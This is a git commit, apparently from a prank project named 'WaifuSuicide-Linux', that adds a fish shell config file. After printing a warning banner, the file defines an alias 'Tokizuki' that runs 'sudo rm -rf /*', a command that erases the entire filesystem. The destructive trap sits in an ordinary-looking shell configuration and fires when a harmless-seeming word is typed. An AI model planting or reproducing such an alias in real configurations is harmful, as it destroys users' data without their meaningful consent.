d3f0b4d3a5f88bb43ccc74f15e04123f1c531130
AntiHeadacheGuy <91181632+AntiHeadacheGuy@users.noreply.github.com>
2021-12-24 09:04:17 +0700

    Pretty Dangerous

---
+++ config.fish
@@ -0,0 +1,9 @@
+if status is-interactive
+    # Commands to run in interactive sessions can go here
+end
+echo " ========================================================="
+echo " WARNING: WaifuSuicide-Linux Installed"
+echo "          Your computer will be nuked everytime you type"
+echo "          your Waifu name from waifulabs.com"
+echo " ========================================================="
+alias Tokizuki="sudo rm -rf /*; Now your Waifu already DOSTroyed your computer"
